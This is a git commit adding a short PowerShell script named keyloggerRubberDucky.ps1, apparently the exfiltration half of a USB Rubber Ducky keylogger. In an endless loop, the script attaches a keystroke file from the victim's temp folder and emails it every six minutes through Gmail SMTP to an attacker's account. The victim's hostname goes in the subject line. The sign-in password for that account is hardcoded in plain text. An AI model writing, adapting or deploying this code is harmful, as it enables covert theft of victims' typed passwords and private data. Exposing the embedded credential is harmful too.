623e6558db5464d21e4558b7bf20402aa4b02ae3
daddyd18777 <88235298+daddyd18777@users.noreply.github.com>
2021-08-05 16:23:25 -0600

    Add files via upload

---
+++ keyloggerRubberDucky.ps1
@@ -0,0 +1,9 @@
+﻿$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('keyloggingdaddy@gmail.com', 'Molly922')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'keyloggingdaddy@gmail.com'
+$ReportEmail.To.Add('keyloggingdaddy@gmail.com')
+$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 360} 
